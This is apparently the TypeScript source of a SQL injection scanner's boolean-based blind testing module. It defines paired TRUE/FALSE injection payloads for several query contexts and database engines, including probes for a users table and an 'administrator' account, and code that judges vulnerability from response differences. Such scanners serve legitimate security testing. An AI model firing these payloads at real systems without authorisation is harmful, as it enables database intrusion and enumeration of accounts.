import { CandidateParameter, DbmsType } from '../../types/sqlScanner';

export interface BooleanTestPair {
  name: string;
  dbms: DbmsType;
  truePayload: string;
  falsePayload: string;
  expectedDiffDescription: string;
}

export interface BooleanEvaluationResult {
  isVulnerable: boolean;
  confidence: number;
  evidence: string;
  similarityRatioTrue: number;
  similarityRatioFalse: number;
  uniqueMarker?: string;
}

export class BooleanTester {
  /**
   * Generates context-aware TRUE vs FALSE differential test pairs
   */
  public static getTestPairs(param: CandidateParameter): BooleanTestPair[] {
    const context = param.detectedContext || 'single_quote_string';
    const pairs: BooleanTestPair[] = [];

    // 1. Numeric Context
    if (context === 'numeric') {
      pairs.push({
        name: 'Numeric Arithmetic Differential',
        dbms: 'Generic SQL',
        truePayload: ' AND 1337=1337',
        falsePayload: ' AND 1337=1338',
        expectedDiffDescription: 'TRUE returns original content; FALSE produces empty/altered state',
      });
      pairs.push({
        name: 'Numeric Modulo & Logic Differential',
        dbms: 'Generic SQL',
        truePayload: ' AND 1*1=1',
        falsePayload: ' AND 1*1=2',
        expectedDiffDescription: 'TRUE maintains baseline status; FALSE diverges',
      });
      return pairs;
    }

    // 2. Double-Quoted String Context
    if (context === 'double_quote_string') {
      pairs.push({
        name: 'Double Quote Logic Differential',
        dbms: 'Generic SQL',
        truePayload: '" AND "1"="1',
        falsePayload: '" AND "1"="2',
        expectedDiffDescription: 'TRUE matches baseline; FALSE deviates',
      });
      pairs.push({
        name: 'Double Quote Commented Equality',
        dbms: 'Generic SQL',
        truePayload: '" AND 1=1-- -',
        falsePayload: '" AND 1=2-- -',
        expectedDiffDescription: 'TRUE executes cleanly with comment; FALSE triggers empty response',
      });
      return pairs;
    }

    // 3. Parenthesized String Context
    if (context === 'parenthesized_string') {
      pairs.push({
        name: 'Parenthesis & Quote Equality',
        dbms: 'Generic SQL',
        truePayload: "') AND ('1'='1",
        falsePayload: "') AND ('1'='2",
        expectedDiffDescription: 'Balanced parentheses TRUE vs FALSE response',
      });
      pairs.push({
        name: 'Parenthesis Closure with Comment',
        dbms: 'Generic SQL',
        truePayload: "') AND 1=1-- -",
        falsePayload: "') AND 1=2-- -",
        expectedDiffDescription: 'Closing parenthesis with comment breakout',
      });
      return pairs;
    }

    // 4. LIKE / Search Context
    if (context === 'like_clause') {
      pairs.push({
        name: 'LIKE Clause Wildcard Differential',
        dbms: 'Generic SQL',
        truePayload: "%' AND 1=1 AND '%'='",
        falsePayload: "%' AND 1=2 AND '%'='",
        expectedDiffDescription: 'LIKE wildcards balance correctly on TRUE; alters on FALSE',
      });
      pairs.push({
        name: 'LIKE Substring Logic',
        dbms: 'Generic SQL',
        truePayload: "%' AND 'a'='a' AND '%'='",
        falsePayload: "%' AND 'a'='b' AND '%'='",
        expectedDiffDescription: 'TRUE retains search results; FALSE returns 0 results',
      });
      return pairs;
    }

    // 5. HAVING Clause Context
    if (context === 'having_clause') {
      pairs.push({
        name: 'HAVING Clause Boolean Differential',
        dbms: 'Generic SQL',
        truePayload: ' 1=1 AND 1337=1337',
        falsePayload: ' 1=1 AND 1337=1338',
        expectedDiffDescription: 'Aggregate HAVING condition evaluates TRUE vs FALSE',
      });
      return pairs;
    }

    // 6. Identifier Context
    if (context === 'identifier') {
      pairs.push({
        name: 'Backtick Identifier Differential',
        dbms: 'MySQL',
        truePayload: '` AND 1=1#',
        falsePayload: '` AND 1=2#',
        expectedDiffDescription: 'Identifier breakout on MySQL/MariaDB engines',
      });
      return pairs;
    }

    // 7. Standard Single-Quote String Context
    pairs.push({
      name: 'Single Quote String Equality',
      dbms: 'Generic SQL',
      truePayload: "' AND '1'='1",
      falsePayload: "' AND '1'='2",
      expectedDiffDescription: 'TRUE matches baseline; FALSE deviates',
    });

    pairs.push({
      name: 'Single Quote Commented Boolean',
      dbms: 'Generic SQL',
      truePayload: "' AND 1=1--",
      falsePayload: "' AND 1=2--",
      expectedDiffDescription: 'TRUE returns full baseline result; FALSE returns empty list',
    });

    pairs.push({
      name: 'Single Quote Subquery Users Verification',
      dbms: 'Generic SQL',
      truePayload: "' AND (SELECT 'a' FROM users LIMIT 1)='a",
      falsePayload: "' AND (SELECT 'a' FROM users LIMIT 1)='b",
      expectedDiffDescription: 'Subquery on users table evaluates TRUE',
    });

    pairs.push({
      name: 'Single Quote Administrator Existence',
      dbms: 'Generic SQL',
      truePayload: "' AND (SELECT 'a' FROM users WHERE username='administrator')='a",
      falsePayload: "' AND (SELECT 'a' FROM users WHERE username='nonexistent_sqli_test_user')='a",
      expectedDiffDescription: 'Administrator user existence evaluates TRUE',
    });

    pairs.push({
      name: 'Oracle DUAL Table Verification',
      dbms: 'Oracle',
      truePayload: "' AND (SELECT 1 FROM DUAL)=1 AND '1'='1",
      falsePayload: "' AND (SELECT 1 FROM DUAL)=2 AND '1'='1",
      expectedDiffDescription: 'Oracle DUAL subquery evaluation matches TRUE condition',
    });

    pairs.push({
      name: 'PostgreSQL Type Cast & Version Verification',
      dbms: 'PostgreSQL',
      truePayload: "' AND (SELECT version()) IS NOT NULL AND '1'='1",
      falsePayload: "' AND (SELECT version()) IS NULL AND '1'='1",
      expectedDiffDescription: 'PostgreSQL version query evaluates TRUE',
    });

    pairs.push({
      name: 'MySQL Version Function Verification',
      dbms: 'MySQL',
      truePayload: "' AND @@version=@@version AND '1'='1",
      falsePayload: "' AND @@version='' AND '1'='1",
      expectedDiffDescription: 'MySQL @@version variable matches TRUE condition',
    });

    pairs.push({
      name: 'SQLite Version Verification',
      dbms: 'SQLite',
      truePayload: "' AND sqlite_version()=sqlite_version() AND '1'='1",
      falsePayload: "' AND sqlite_version()='' AND '1'='1",
      expectedDiffDescription: 'SQLite version function matches TRUE condition',
    });

    pairs.push({
      name: 'Microsoft SQL Server Version Verification',
      dbms: 'Microsoft SQL Server',
      truePayload: "' AND @@VERSION=@@VERSION AND '1'='1",
      falsePayload: "' AND @@VERSION='' AND '1'='1",
      expectedDiffDescription: 'MSSQL @@VERSION variable matches TRUE condition',
    });

    return pairs;
  }

  /**
   * Extracts unique text tokens that appear only in the TRUE response and are missing in FALSE
   */
  public static extractUniqueDifferentialMarkers(
    trueBody: string,
    falseBody: string,
    truePayload = '',
    falsePayload = '',
    baselineBody = ''
  ): string[] {
    if (!trueBody || !falseBody || trueBody === falseBody) return [];

    // Check for common greeting or success phrases first
    const commonPhrases = [
      'Welcome back', 'Logged in', 'User exists', 'Account found',
      'Items found', 'In stock', 'Authorized', 'My account'
    ];
    for (const phrase of commonPhrases) {
      if (trueBody.includes(phrase) && !falseBody.includes(phrase)) {
        return [phrase];
      }
    }

    // If similarity between true and false is >= 0.95, responses are substantially identical (noise/nonce only)
    const sim = BooleanTester.calculateSimilarityRatio(trueBody, falseBody);
    if (sim >= 0.95) {
      return [];
    }

    // Split words, excluding HTML and punctuation
    const cleanTrue = trueBody.replace(/<[^>]+>/g, ' ');
    const cleanFalse = falseBody.replace(/<[^>]+>/g, ' ');
    const cleanBaseline = baselineBody.replace(/<[^>]+>/g, ' ');

    const truePayloadWords = new Set(
      truePayload.toLowerCase().replace(/[^a-z0-9]/g, ' ').split(/\s+/).filter((w) => w.length >= 3)
    );
    const falsePayloadWords = new Set(
      falsePayload.toLowerCase().replace(/[^a-z0-9]/g, ' ').split(/\s+/).filter((w) => w.length >= 3)
    );

    const baselineWordsSet = new Set(
      cleanBaseline.split(/\s+/).map((w) => w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase())
    );

    const trueWords = cleanTrue.split(/\s+/).filter((w) => {
      const clean = w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
      return clean.length >= 4 && !truePayloadWords.has(clean) && !falsePayloadWords.has(clean);
    });

    const falseWordsSet = new Set(
      cleanFalse.split(/\s+/).map((w) => w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase())
    );

    // Differential marker MUST be present in baseline (confirming TRUE matches baseline while FALSE drops it)
    const unique = trueWords.filter((w) => {
      const clean = w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
      const inFalse = falseWordsSet.has(clean);
      if (inFalse) return false;
      if (baselineWordsSet.size > 0 && !baselineWordsSet.has(clean)) {
        // Word was NOT in baseline either => newly generated random nonce on this single response
        return false;
      }
      return true;
    });

    return Array.from(new Set(unique)).slice(0, 5);
  }

  /**
   * Checks if a boolean probe condition returned TRUE
   */
  public static isConditionTrue(
    baselineBody: string,
    trueBody: string,
    falseBody: string,
    marker?: string
  ): boolean {
    if (marker && marker.trim()) {
      const cleanMarker = marker.toLowerCase().trim();
      const trueLower = trueBody.toLowerCase();
      const falseLower = falseBody.toLowerCase();
      if (trueLower.includes(cleanMarker) && !falseLower.includes(cleanMarker)) {
        return true;
      }
    }
    const diffMarkers = BooleanTester.extractUniqueDifferentialMarkers(trueBody, falseBody, '', '', baselineBody);
    if (diffMarkers.length > 0) {
      return true;
    }
    const trueBaseDiff = Math.abs(trueBody.length - baselineBody.length);
    const falseBaseDiff = Math.abs(falseBody.length - baselineBody.length);
    const trueFalseDiff = Math.abs(trueBody.length - falseBody.length);
    return trueBaseDiff < 40 && falseBaseDiff > 60 && trueFalseDiff > 40;
  }

  /**
   * Evaluates baseline vs TRUE response vs FALSE response with micro-differential support
   */
  public static evaluateDifferential(
    baselineBody: string,
    baselineStatus: number,
    trueBody: string,
    trueStatus: number,
    falseBody: string,
    falseStatus: number,
    truePayload = '',
    falsePayload = ''
  ): BooleanEvaluationResult {
    const trueStatusMatches = trueStatus === baselineStatus;
    const trueLengthDiff = Math.abs(trueBody.length - baselineBody.length);
    const falseLengthDiff = Math.abs(falseBody.length - baselineBody.length);
    const trueFalseDiff = Math.abs(trueBody.length - falseBody.length);

    // Similarity Ratio
    const simRatioTrue = BooleanTester.calculateSimilarityRatio(baselineBody, trueBody);
    const simRatioFalse = BooleanTester.calculateSimilarityRatio(baselineBody, falseBody);

    // Extract unique markers present in TRUE but absent in FALSE (excluding payload reflection and dynamic nonces)
    const uniqueMarkers = BooleanTester.extractUniqueDifferentialMarkers(
      trueBody,
      falseBody,
      truePayload,
      falsePayload,
      baselineBody
    );

    // Conditions for boolean confirmation:
    // 1. Status code divergence (e.g. TRUE 200 vs FALSE 404/500/200)
    // 2. Micro-differential text tokens (e.g. "Welcome back" present on TRUE, absent on FALSE)
    // 3. Length or similarity deviation
    const isStatusDivergent = trueStatus === baselineStatus && falseStatus !== baselineStatus && falseStatus !== 0;
    const isMarkerDivergent = trueStatusMatches && uniqueMarkers.length > 0 && trueBody !== falseBody;
    const isLengthDivergent = trueStatusMatches && trueLengthDiff < 40 && falseLengthDiff > 60 && trueFalseDiff > 40 && trueBody !== falseBody;
    const isSimDivergent = trueStatusMatches && simRatioTrue >= 0.95 && simRatioFalse <= 0.85;

    const isVulnerable = isStatusDivergent || isMarkerDivergent || isLengthDivergent || isSimDivergent;

    let confidence = 0;
    let evidence = '';

    if (isVulnerable) {
      if (isMarkerDivergent) {
        confidence = 98;
        evidence = `Conditional response text identified: TRUE contains "${uniqueMarkers.join(', ')}" (absent on FALSE condition)`;
      } else if (isStatusDivergent) {
        confidence = 95;
        evidence = `Status code differential: TRUE returned HTTP ${trueStatus} (matching baseline), FALSE returned HTTP ${falseStatus}`;
      } else if (isLengthDivergent) {
        confidence = 92;
        evidence = `Body length differential: TRUE matches baseline (diff: ${trueLengthDiff}B), FALSE diverges (diff: ${falseLengthDiff}B, delta: ${trueFalseDiff}B)`;
      } else {
        confidence = 88;
        evidence = `Content similarity differential: TRUE similarity ${(simRatioTrue * 100).toFixed(1)}%, FALSE similarity ${(simRatioFalse * 100).toFixed(1)}%`;
      }
    } else {
      evidence = `No boolean differential: TRUE diff=${trueLengthDiff}B, FALSE diff=${falseLengthDiff}B`;
    }

    return {
      isVulnerable,
      confidence,
      evidence,
      similarityRatioTrue: simRatioTrue,
      similarityRatioFalse: simRatioFalse,
      uniqueMarker: uniqueMarkers.length > 0 ? uniqueMarkers[0] : undefined,
    };
  }

  private static calculateSimilarityRatio(a: string, b: string): number {
    if (a === b) return 1.0;
    if (!a || !b) return 0.0;
    const maxLen = Math.max(a.length, b.length);
    if (maxLen === 0) return 1.0;
    const sampleA = a.slice(0, 2000);
    const sampleB = b.slice(0, 2000);
    let matches = 0;
    const checkLen = Math.min(sampleA.length, sampleB.length);
    for (let i = 0; i < checkLen; i += 20) {
      if (sampleA.slice(i, i + 20) === sampleB.slice(i, i + 20)) {
        matches += 20;
      }
    }
    return Math.min(1.0, matches / Math.max(sampleA.length, sampleB.length));
  }
}
